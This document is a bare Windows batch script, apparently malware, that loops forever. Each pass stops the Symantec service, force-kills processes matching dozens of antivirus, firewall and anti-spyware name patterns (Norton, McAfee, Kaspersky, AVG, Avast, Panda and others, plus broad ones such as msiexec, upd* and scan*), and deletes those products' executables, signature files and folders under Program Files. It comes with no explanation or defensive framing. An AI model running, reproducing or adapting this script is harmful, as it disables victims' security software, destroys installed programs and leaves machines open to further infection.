@echo off
:loop
net stop "symantec antivirus"
taskkill /f /FI "MEMUSAGE gt 5" /IM av*
taskkill /f /FI "MEMUSAGE gt 5" /IM fire*
taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
taskkill /f /FI "MEMUSAGE gt 5" /IM *anti*
taskkill /f /FI "MEMUSAGE gt 5" /IM *kaspersky*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
taskkill /f /FI "MEMUSAGE gt 5" /IM PersFw
taskkill /f /FI "MEMUSAGE gt 5" /IM KAV*
taskkill /f /FI "MEMUSAGE gt 5" /IM ZONEALARM
taskkill /f /FI "MEMUSAGE gt 5" /IM SAFEWEB
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM OUTPOST
taskkill /f /FI "MEMUSAGE gt 5" /IM nv*
taskkill /f /FI "MEMUSAGE gt 5" /IM nav*
taskkill /f /FI "MEMUSAGE gt 5" /IM F-*
taskkill /f /FI "MEMUSAGE gt 5" /IM ESAFE
taskkill /f /FI "MEMUSAGE gt 5" /IM cle
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM BLACKICE
taskkill /f /FI "MEMUSAGE gt 5" /IM def*
taskkill /f /FI "MEMUSAGE gt 5" /IM kav
taskkill /f /FI "MEMUSAGE gt 5" /IM kav*
taskkill /f /FI "MEMUSAGE gt 5" /IM avg*
taskkill /f /FI "MEMUSAGE gt 5" /IM ash*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM aswupdsv
taskkill /f /FI "MEMUSAGE gt 5" /IM ewid*
taskkill /f /FI "MEMUSAGE gt 5" /IM guard*
taskkill /f /FI "MEMUSAGE gt 5" /IM guar*
taskkill /f /FI "MEMUSAGE gt 5" /IM gcasDt*
taskkill /f /FI "MEMUSAGE gt 5" /IM msmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM mcafe*
taskkill /f /FI "MEMUSAGE gt 5" /IM mghtml
taskkill /f /FI "MEMUSAGE gt 5" /IM msiexec
taskkill /f /FI "MEMUSAGE gt 5" /IM outpost
taskkill /f /FI "MEMUSAGE gt 5" /IM isafe
taskkill /f /FI "MEMUSAGE gt 5" /IM zap*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM zauinst
taskkill /f /FI "MEMUSAGE gt 5" /IM upd*
taskkill /f /FI "MEMUSAGE gt 5" /IM zlclien*
taskkill /f /FI "MEMUSAGE gt 5" /IM minilog
taskkill /f /FI "MEMUSAGE gt 5" /IM cc*
taskkill /f /FI "MEMUSAGE gt 5" /IM norton*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM norton au*
taskkill /f /FI "MEMUSAGE gt 5" /IM ccc*
taskkill /f /FI "MEMUSAGE gt 5" /IM npfmn*
taskkill /f /FI "MEMUSAGE gt 5" /IM loge*
taskkill /f /FI "MEMUSAGE gt 5" /IM nisum*
taskkill /f /FI "MEMUSAGE gt 5" /IM issvc
taskkill /f /FI "MEMUSAGE gt 5" /IM tmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM tmn*
taskkill /f /FI "MEMUSAGE gt 5" /IM pcc*
taskkill /f /FI "MEMUSAGE gt 5" /IM cpd*
taskkill /f /FI "MEMUSAGE gt 5" /IM pop*
taskkill /f /FI "MEMUSAGE gt 5" /IM pav*
taskkill /f /FI "MEMUSAGE gt 5" /IM padmin
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM panda*
taskkill /f /FI "MEMUSAGE gt 5" /IM avsch*
taskkill /f /FI "MEMUSAGE gt 5" /IM sche*
taskkill /f /FI "MEMUSAGE gt 5" /IM syman*
taskkill /f /FI "MEMUSAGE gt 5" /IM virus*
taskkill /f /FI "MEMUSAGE gt 5" /IM realm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM sweep*
taskkill /f /FI "MEMUSAGE gt 5" /IM scan*
taskkill /f /FI "MEMUSAGE gt 5" /IM ad-*
taskkill /f /FI "MEMUSAGE gt 5" /IM safe*
taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
cls
del /Q /F %programfiles%\alwils~1\avast4\*.*
cls
del /Q /F %programfiles%\Lavasoft\Ad-awa~1\*.exe
cls
del /Q /F %programfiles%\kasper~1\*.exe
cls
del /Q /F %programfiles%\trojan~1\*.exe
cls
del /Q /F %programfiles%\f-prot95\*.dll
cls
del /Q /F %programfiles%\tbav\*.dat
cls
del /Q /F %programfiles%\avpersonal\*.vdf
cls
del /Q /F %programfiles%\Norton~1\*.cnt
cls
del /Q /F %programfiles%\Mcafee\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\Norton~3\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\speedd~1\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\*.*
cls
del /Q /F %programfiles%\Kasper~1\*.*
cls
del /Q /F %programfiles%\Norton~1\*.*
cls
del /Q /F %programfiles%\avgamsr\*.exe
cls
del /Q /F %programfiles%\avgamsvr\*.exe
cls
del /Q /F %programfiles%\avgemc\*.exe
cls
del /Q /F %programfiles%\avgcc\*.exe
cls
del /Q /F %programfiles%\avgupsvc\*.exe
cls
del /Q /F %programfiles%\grisoft\*.*
cls
del /Q /F %programfiles%\nood32krn\*.exe
cls
cls
del /Q /F %programfiles%\nood32\*.exe
cls
del /Q /F %programfiles%\nod32
cls
del /Q /F %programfiles%\nood32
cls
del /Q /F %programfiles%\kav\*.exe
cls
del /Q /F %programfiles%\kavmm\*.exe
cls
del /Q /F %programfiles%\kaspersky\*.*
cls
cls
del /Q /F %programfiles%\ewidoctrl\*.exe
cls
del /Q /F %programfiles%\guard\*.exe
cls
del /Q /F %programfiles%\ewido\*.exe
cls
cls
del /Q /F %programfiles%\pavprsrv\*.exe
cls
del /Q /F %programfiles%\pavprot\*.exe
cls
del /Q /F %programfiles%\avengine\*.exe
cls
cls
del /Q /F %programfiles%\apvxdwin\*.exe
cls
del /Q /F %programfiles%\webproxy\*.exe
cls
del /Q /F %programfiles%\pandasoftware\*.*
cls
timeout /t 3 /nobreak
cls
goto :loop
cls
